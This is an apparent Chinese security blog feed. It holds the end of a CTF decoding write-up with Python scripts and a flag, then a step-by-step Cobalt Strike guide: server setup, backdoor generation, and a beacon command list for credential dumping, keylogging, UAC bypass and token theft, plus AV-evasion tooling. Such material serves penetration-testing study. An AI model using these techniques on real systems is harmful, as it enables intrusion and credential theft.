hJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBLJDphJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJBphLzphJDBhJDBhMjBhJDBhJDBvJDBhJDBhJD4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthDjBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBsJDBhJDBvJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBLLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBsJDBhJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJBphJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsDjBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBLJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhMjBhJDBhMjBsJDBhMjBhJDBhLxphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhDjBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBLJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhLzBhJDBhJDBhLxphJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphMjBvJD4hLzBhJDBhMjBhJDBhDjthJDBhJDBhJDthJDphJDBhJDBsLjBrJDthJDBhJD4hJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDBhJDthJDphJDBLJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhLzphJBphJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhDjBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBLJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBsJDBhJDBhJDBsJDBrJBphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhMjBhJDBhMjBhJDBhMjBhJDBhDj4hLzBhJDBhMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBLJDBhLzphJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDthJDBhJDBhJDthJDphJDBhJDBhLzphJDBhJDBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLxprJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBhJDBhLzBhLjBhJDBhJDBsLjBhJDBhDjBhJDthJDphJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBhLzphMjBvJDthMjBhJDBhLzBhJDBhJDBhLzBhLjBhJDBhJDtrJDBhJDBhJDBsJDBrJDBhJDBsLjBhJDBLJDBhJDthJDphJDBhJDBsLjBsJDBhJDBhJD4=</span><br></pre></td></tr></table></figure><blockquote><p>看到末尾的=，想到base64，所以是凯撒与base64的结合。</p><p>先用脚本爆破凯撒，将结果用base64编码</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"># 截取文件最前面一部分进行猜测，因为根据后面可知这一部分是近似的四字符反复重复</span><br><span class="line">key = &quot;JDBhJDBsJDBhJDBsJDBhJDBhJDBsJDBrJDBhJDBhLzphJDBhJDBhJDthJDphJDBh&quot;</span><br><span class="line"> </span><br><span class="line"># 遍历凯撒加密中25种的可能性</span><br><span class="line">for n in range(0, 26):</span><br><span class="line">    str_encrypt = &quot;&quot;</span><br><span class="line">    for letter in key:</span><br><span class="line">        if &quot;a&quot; &lt;= letter &lt;= &quot;z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;a&quot;) + n) % 26 + ord(&quot;a&quot;))</span><br><span class="line">        elif &quot;A&quot; &lt;= letter &lt;= &quot;Z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;A&quot;) + n) % 26 + ord(&quot;A&quot;))</span><br><span class="line">        else:</span><br><span class="line">            str_encrypt += letter</span><br><span class="line"> </span><br><span class="line">    # 输出每一种可能性最后的结果</span><br><span class="line">    print(base64.decodebytes(str_encrypt.encode()))</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241119234133869.png" alt="image-20241119234133869"></p><blockquote><p>结果中发现只有当n=25时，会出现starry语言特有的+，*等符号</p><p>于是用脚本将其全部转化成starry语言</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">with open(&quot;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\flag.txt&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:    #flag.txt是凯撒密码的文本</span><br><span class="line">    str_encrypt = &quot;&quot;</span><br><span class="line">    n = 25</span><br><span class="line">    for letter in f.read():</span><br><span class="line">        if &quot;a&quot; &lt;= letter &lt;= &quot;z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;a&quot;) + n) % 26 + ord(&quot;a&quot;))</span><br><span class="line">        elif &quot;A&quot; &lt;= letter &lt;= &quot;Z&quot;:</span><br><span class="line">            str_encrypt += chr((ord(letter) - ord(&quot;A&quot;) + n) % 26 + ord(&quot;A&quot;))</span><br><span class="line">        else:</span><br><span class="line">            str_encrypt += letter</span><br><span class="line">    open(&quot;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\flag.starry&quot;, &quot;wb&quot;).write(base64.decodebytes(str_encrypt.encode()))</span><br></pre></td></tr></table></figure><blockquote><p>最后用starry语言转换脚本转换就能得到flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">fp = open(&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\flag.starry&#x27;)     #flag.starry是保存的starry语言文件</span><br><span class="line">data = fp.read()</span><br><span class="line">fs = open(&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\f.txt&#x27;, &#x27;w&#x27;)       #f.txt是输出的中间文件</span><br><span class="line">sub = 0</span><br><span class="line">for i in data:</span><br><span class="line">    if i == &#x27;\n&#x27;:</span><br><span class="line">        continue</span><br><span class="line">    elif i == &#x27; &#x27;:</span><br><span class="line">        sub += 1</span><br><span class="line">    elif i == &#x27;+&#x27;:</span><br><span class="line">        if sub == 1:</span><br><span class="line">            fs.write(&#x27;dup\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 2:</span><br><span class="line">            fs.write(&#x27;swap\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 3:</span><br><span class="line">            fs.write(&#x27;rotate\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 4:</span><br><span class="line">            fs.write(&#x27;pop\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        else:</span><br><span class="line">            fs.write(&#x27;push  &#x27; + str(sub-5) + &#x27;\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">    elif i == &#x27;*&#x27;:</span><br><span class="line">        if sub == 0:</span><br><span class="line">            fs.write(&#x27;+\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 1:</span><br><span class="line">            fs.write(&#x27;-\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 2:</span><br><span class="line">            fs.write(&#x27;*\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 3:</span><br><span class="line">            fs.write(&#x27;/\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        elif sub == 4:</span><br><span class="line">            fs.write(&#x27;%\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        else:</span><br><span class="line">            print(&#x27;error!!!&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">            sys.exit()</span><br><span class="line">    elif i == &#x27;.&#x27;:</span><br><span class="line">        if sub == 0:</span><br><span class="line">            fs.write(&#x27;num_out\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">        else:</span><br><span class="line">            fs.write(&#x27;char_out\n&#x27;)</span><br><span class="line">            sub = 0</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;error!!!!&#x27;)</span><br><span class="line">        sys.exit()</span><br><span class="line">fp.close()</span><br><span class="line">fs.close()</span><br><span class="line">fp = open(&#x27;C:\\Users\\Lucky\\Desktop\\华科杯\\misc\\一闪一闪亮晶晶\\f.txt&#x27;, &#x27;r&#x27;)</span><br><span class="line">data = []</span><br><span class="line">for line in fp:</span><br><span class="line">    line = line.strip(&#x27;\n&#x27;)</span><br><span class="line">    if line[:4] == &#x27;push&#x27;:</span><br><span class="line">        data.append(int(line.split(&#x27;  &#x27;)[1]))</span><br><span class="line">    elif line == &#x27;*&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        y = data[-2]</span><br><span class="line">        data = data[:-2]</span><br><span class="line">        data.append(x * y)</span><br><span class="line">    elif line == &#x27;+&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        y = data[-2]</span><br><span class="line">        data = data[:-2]</span><br><span class="line">        data.append(x + y)</span><br><span class="line">    elif line == &#x27;-&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        y = data[-2]</span><br><span class="line">        data = data[:-2]</span><br><span class="line">        if (x-y)&lt;0:</span><br><span class="line">            data.append(y-x)</span><br><span class="line">        else:</span><br><span class="line">            data.append(x-y)</span><br><span class="line">    elif line == &#x27;dup&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        data.append(x)</span><br><span class="line">    elif line == &#x27;char_out&#x27;:</span><br><span class="line">        x = data[-1]</span><br><span class="line">        data = data[:-1]</span><br><span class="line">        print(chr(x),end=&quot;&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;error!!!&#x27;)</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><blockquote><p>flag{785c45ea-d2a1-4993-8d4f-325323d5bcd9}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike4.8汉化版带插件使用方法</title>
      <link href="/posts/4aeca11a.html"/>
      <url>/posts/4aeca11a.html</url>
      
        <content type="html"><![CDATA[<p>使用大致流程<br>创建团队服务器-&gt;客户端连接服务器-&gt;创建监听器-&gt;生成后门对应监听器-&gt;靶机运行后门成功上线-&gt;后渗透（提权，内网漫游，域渗透等）</p><h2 id="一、安装">一、安装</h2><p><img src="https://i-blog.csdnimg.cn/blog_migrate/fd8da35e28b5c9bc7b8132070b54a3c7.png" alt="在这里插入图片描述"><br>把全部文件下上传到外网VPS上，并给足权限<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1d68638ddd135505086d548f1c394c61.png" alt="在这里插入图片描述"><br>服务端运行起来<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/eff03a78ec9383205a4be2c0f9c6effc.png" alt="在这里插入图片描述"></p><p>本地电脑使用<a href="https://so.csdn.net/so/search?q=%E5%AE%A2%E6%88%B7%E7%AB%AF&amp;spm=1001.2101.3001.7020">客户端</a>连接即可<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/6dad38954540036b265ccfa25241ffe7.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2f791f60db73100ac4a92527dce51fe9.png" alt="在这里插入图片描述"><br>主要输入<code>HOST、Port、password</code>即可</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/bb05f44ff7b7c4ec14c9563d55efb2d3.png" alt="在这里插入图片描述"></p><h2 id="二、上线">二、上线</h2><h3 id="1、设置监听器">1、设置监听器</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e1a94fb37712fac9533688c672ea9028.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b8c145b86c42438ac11b4b3350b249e9.png" alt="在这里插入图片描述"></p><h3 id="2、生成木马后门">2、生成木马后门</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/56362e228cba526ec1c3ca073c78d34c.png" alt="在这里插入图片描述"></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/90ad2a56214be9a95dad682bd75de839.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/006995bcb55100b36211940a6e3fb6f0.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/d2a9e1f98caa9d8913a74c34750058a5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/59550d2c11e32bc849fd98fb2e140011.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/19fe4aeb1089455d9cd7935350e4a682.png" alt="在这里插入图片描述"><br>运行即可上线CS<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/4dffee027c99823dac41e8f4baf87f5f.png" alt="在这里插入图片描述"></p><p>3、指令大全</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">browserpivot 注入受害者浏览器进程</span><br><span class="line">sleep 3 全部命令3秒执行</span><br><span class="line">bypassuac 绕过UAC</span><br><span class="line">cancel 取消正在进行的下载</span><br><span class="line">cd 切换目录</span><br><span class="line">checkin 强制让被控端回连一次</span><br><span class="line">clear 清除beacon内部的任务队列</span><br><span class="line">connect Connect to a Beacon peerover TCP</span><br><span class="line">covertvpn 部署Covert VPN客户端</span><br><span class="line">cp 复制文件</span><br><span class="line">dcsync 从DC中提取密码哈希</span><br><span class="line">desktop 远程VNC</span><br><span class="line">dllinject 反射DLL注入进程</span><br><span class="line">dllload 使用LoadLibrary将DLL加载到进程中</span><br><span class="line">download 下载文件</span><br><span class="line">downloads 列出正在进行的文件下载</span><br><span class="line">drives 列出目标盘符</span><br><span class="line">elevate 尝试提权</span><br><span class="line">execute 在目标上执行程序(无输出)</span><br><span class="line">execute-assembly 在目标上内存中执行本地.NET程序</span><br><span class="line">exit 退出beacon</span><br><span class="line">getprivs Enable system privileges oncurrent token</span><br><span class="line">getsystem 尝试获取SYSTEM权限</span><br><span class="line">getuid 获取用户ID</span><br><span class="line">hashdump 转储密码哈希值</span><br><span class="line">help 帮助</span><br><span class="line">inject 在特定进程中生成会话</span><br><span class="line">jobkill 杀死一个后台任务</span><br><span class="line">jobs 列出后台任务</span><br><span class="line">kerberos_ccache_use 从ccache文件中导入票据应用于此会话</span><br><span class="line">kerberos_ticket_purge 清除当前会话的票据</span><br><span class="line">kerberos_ticket_use 从ticket文件中导入票据应用于此会话</span><br><span class="line">keylogger 键盘记录</span><br><span class="line">kill 结束进程</span><br><span class="line">link Connect to a Beacon peerover a named pipe</span><br><span class="line">logonpasswords 使用mimikatz转储凭据和哈希值</span><br><span class="line">ls 列出文件</span><br><span class="line">make_token 创建令牌以传递凭据</span><br><span class="line">mimikatz 运行mimikatz</span><br><span class="line">mkdir 创建一个目录</span><br><span class="line">mode dns 使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">mode http 使用HTTP作为通信通道</span><br><span class="line">mv 移动文件</span><br><span class="line">net net命令</span><br><span class="line">note 备注</span><br><span class="line">portscan 进行端口扫描</span><br><span class="line">powerpick 通过Unmanaged PowerShell执行命令</span><br><span class="line">powershell 通过powershell.exe执行命令</span><br><span class="line">powershell-import 导入powershell脚本</span><br><span class="line">ppid Set parent PID forspawned post-ex jobs</span><br><span class="line">ps 显示进程列表</span><br><span class="line">psexec Use a service to spawn asession on a host</span><br><span class="line">psexec_psh Use PowerShell to spawn asession on a host</span><br><span class="line">psinject 在特定进程中执行PowerShell命令</span><br><span class="line">pth 使用Mimikatz进行传递哈希</span><br><span class="line">pwd 当前目录位置</span><br><span class="line">reg Query the registry</span><br><span class="line">rev2self 恢复原始令牌</span><br><span class="line">rm 删除文件或文件夹</span><br><span class="line">rportfwd 端口转发</span><br><span class="line">run 在目标上执行程序(返回输出)</span><br><span class="line">runas 以另一个用户权限执行程序</span><br><span class="line">runasadmin 在高权限下执行程序</span><br><span class="line">runu Execute a program underanother PID</span><br><span class="line">screenshot 屏幕截图</span><br><span class="line">setenv 设置环境变量</span><br><span class="line">shell cmd.exe  打开cmd终端</span><br><span class="line">shell ipconfig 执行ipconfig命令</span><br><span class="line">shinject 将shellcode注入进程</span><br><span class="line">shspawn 生成进程并将shellcode注入其中</span><br><span class="line">sleep 设置睡眠延迟时间</span><br><span class="line">socks 启动SOCKS4代理</span><br><span class="line">socks stop 停止SOCKS4</span><br><span class="line">spawn Spawn a session</span><br><span class="line">spawnas Spawn a session as anotheruser</span><br><span class="line">spawnto Set executable tospawn processes into</span><br><span class="line">spawnu Spawn a session underanother PID</span><br><span class="line">ssh 使用ssh连接远程主机</span><br><span class="line">ssh-key 使用密钥连接远程主机</span><br><span class="line">steal_token 从进程中窃取令牌</span><br><span class="line">timestomp 将一个文件时间戳应用到另一个文件</span><br><span class="line">unlink Disconnect from parentBeacon</span><br><span class="line">upload 上传文件</span><br><span class="line">wdigest 使用mimikatz转储明文凭据</span><br><span class="line">winrm 使用WinRM在主机上生成会话</span><br><span class="line">wmi 使用WMI在主机上生成会话</span><br><span class="line">argue 进程参数欺骗</span><br></pre></td></tr></table></figure><p>简单执行命令<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/289671437f709365de5a2814c404276a.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> 3 全部命令3秒执行(默认时60秒太长，)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/70585c627c2b72b05a8327148763c874.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">执行系统命令要在命令前加个shell <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f19e237d101f5d2af4c7711ed17dfa1d.png" alt="在这里插入图片描述"></p><h2 id="三、如何加载插件及EXE？">三、如何加载插件及EXE？</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/21e95c67f6a2dd9b78413dd1dea0a43e.png" alt="在这里插入图片描述"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/a608b591991be7e7e89b5c3bb984f4b0.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f1efc47dcc28d2fbb0b79071e12f9baf.png" alt="在这里插入图片描述"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9dc44ed86a5a91ea6ba0d969e4082ff3.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8d62307548f725b99ad73a81ca39315b.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fd4168389490b83b43a09c7ca5be69d5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1f8e05004bd2fa94737dad28ab5d5c60.png" alt="在这里插入图片描述"><br><strong>如果不想加载插件想直接上传成品exe文件也是可以的</strong><br>Ladon插件/工具体积小、免杀<br><a href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a></p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7040b73f54481840d89d14852e65f8f7.png" alt="在这里插入图片描述"><br>可以利用CS自身文件上传功能上传成品的exe或者直接使用插件<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2c0d3ecca0022bd64564630526353b06.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d0e664b3ab32c9f82cc3418f1ced1da5.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dfb7e88979435b5388d14be7384a98a0.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/99cb7148de4fcebe8dec9b12715c3924.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1cac18e081c12f9b1ebb46bd8ae65368.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/02a3a3e8122eb70a4b749a633105c78b.png" alt="在这里插入图片描述"><br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ac9b3c70920e1ac1babff556af996d4a.png" alt="在这里插入图片描述"></p><p>四、联动MSF<br>1、CS-&gt;MSF(CS把权限转交给MSF)</p><p><strong>CS：</strong><br>新建个监听器（监听的协议要与MSF一致，这里监听HTTP协议，那么MSF也要监听HTTP协议）<br>CS监听的协议是windows/foreign/reverse_http字样</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/9f6954a480ba11e21ac47978802618f5.png" alt="在这里插入图片描述"></p><p>spawn msf （要联动的会话上执行该命令）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/751a23740a2febd0a0ed150344224f4e.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀木马+文件捆绑+权限伪装</title>
      <link href="/posts/1bec3970.html"/>
      <url>/posts/1bec3970.html</url>
      
